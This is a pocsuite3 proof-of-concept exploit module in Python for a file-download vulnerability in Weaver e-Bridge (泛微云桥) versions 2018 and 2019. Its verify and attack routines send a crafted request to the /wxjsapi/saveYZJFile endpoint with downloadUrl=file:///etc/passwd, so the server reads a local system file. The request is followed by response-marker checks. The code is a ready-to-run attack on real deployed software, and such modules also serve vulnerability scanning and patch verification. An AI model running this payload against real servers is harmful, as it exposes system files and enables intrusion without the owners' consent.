#!/usr/bin/env python
# coding: utf-8
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''泛微云桥e-Bridge_file-download'''
    desc = ''''''
    solution = ''''''
    severity = '''medium'''
    vulType = '''file-download'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''云桥'''
    appVersion = '''2018,2019'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        result = {}
        self.url, ip, port = parse_ip_port(self.target, 80)
        verify_url = make_verify_url(self.url, "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt", mod=0)
        resp = requests.get(verify_url, verify=False)
        if resp.status_code == 200 and b"filepath" in resp.content and b"id" in resp.content and b"isencrypt" in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = verify_url
            result['VerifyInfo']['port'] = port
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
